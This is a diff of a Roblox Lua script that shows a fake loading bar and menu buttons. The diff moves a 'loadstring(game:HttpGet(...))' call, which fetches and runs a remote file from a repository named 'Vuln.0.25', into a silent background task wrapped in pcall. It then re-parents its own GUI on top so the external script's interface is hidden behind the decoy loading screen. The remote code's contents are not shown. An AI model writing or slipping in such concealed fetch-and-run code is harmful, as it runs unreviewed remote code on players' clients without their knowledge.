@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/Vuln.0.25/refs/heads/main/MercenariesUpdatev3.lua"))()
-
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
@@ -12,6 +10,8 @@ end
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "CustomUI"
 screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling -- allows layering
 screenGui.Parent = playerGui
 
 -- Background
@@ -35,17 +35,30 @@ loadingBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 loadingBar.BorderSizePixel = 0
 loadingBar.Parent = loadingBarBg
 
--- Tween loading bar (5s)
 local TweenService = game:GetService("TweenService")
+
+-- Tween loading bar (5s)
 local loadingTween = TweenService:Create(loadingBar, TweenInfo.new(5), {
     Size = UDim2.new(1, 0, 1, 0)
 })
 loadingTween:Play()
 
+-- 🧠 Load external script silently in background
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/Vuln.0.25/refs/heads/main/MercenariesUpdatev3.lua"))()
+
+        -- Wait a moment for external GUI to be added
+        task.wait(0.5)
+
+        -- Re-parent your GUI to top again (forces it to render above the external one)
+        screenGui.Parent = nil -- temporarily remove
+        screenGui.Parent = playerGui -- reparent to top
+    end)
+end)
+
 -- Wait for bar to fill
 loadingTween.Completed:Wait()
-
--- Remove loading bar
 loadingBarBg:Destroy()
 
 -- Create menu buttons
@@ -69,17 +82,15 @@ for i, name in ipairs(buttonNames) do
     button.TextSize = 20
     button.AutoButtonColor = true
     button.Parent = background
-    buttons[#buttons + 1] = button
+    table.insert(buttons, button)
 end
 
 -- Function to handle click and show 30-second loading
 local function onButtonClick(button)
-    -- Remove all buttons
     for _, btn in pairs(buttons) do
         btn:Destroy()
     end
 
-    -- Create 30s loading bar
     local loadingBarLongBg = Instance.new("Frame")
     loadingBarLongBg.Size = UDim2.new(0.6, 0, 0.05, 0)
     loadingBarLongBg.Position = UDim2.new(0.2, 0, 0.5, 0)
@@ -97,17 +108,14 @@ local function onButtonClick(button)
         Size = UDim2.new(1, 0, 1, 0)
     })
     loadingTweenLong:Play()
-
     loadingTweenLong.Completed:Wait()
 
-    -- Done: You can call the next script or action here
     background:Destroy()
 end
 
--- Connect buttons
-for _, button in pairs(buttons) do
+-- Connect button clicks
+for _, button in ipairs(buttons) do
     button.MouseButton1Click:Connect(function()
         onButtonClick(button)
     end)
 end
-
